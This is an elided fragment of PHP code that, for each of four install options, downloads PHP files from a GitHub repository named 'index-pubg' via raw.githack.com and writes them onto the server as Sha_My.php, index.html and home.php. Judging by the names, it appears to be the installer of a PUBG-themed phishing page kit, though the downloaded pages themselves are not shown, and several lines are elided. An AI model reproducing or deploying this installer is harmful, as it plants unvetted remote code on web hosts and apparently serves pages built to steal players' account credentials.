...
if($install){
 if($install=="F"){
$shamy = file_get_contents("https://raw.githack.com/ahmed-shamy/index-pubg/main/F/F-Sha_My.php");
...
$xx = file_put_contents("index.html", $index); 
 ...
 if($install=="M"){
$shamy = file_get_contents("https://raw.githack.com/ahmed-shamy/index-pubg/main/M/M-Sha_My.php");
$xx = file_put_contents("Sha_My.php", $shamy);
...
$homee = file_put_contents("home.php", $home);
 ...
 if($install=="H"){
$shamy = file_get_contents("https://raw.githack.com/ahmed-shamy/index-pubg/main/H/H-Sha_My.php");
$xx = file_put_contents("Sha_My.php", $shamy);
...
$xx = file_put_contents("index.html", $index);
 ...
 if($install=="P"){
$shamy = file_get_contents("https://raw.githack.com/ahmed-shamy/index-pubg/main/P/P-Sha_My.php");
$xx = file_put_contents("Sha_My.php", $shamy); 
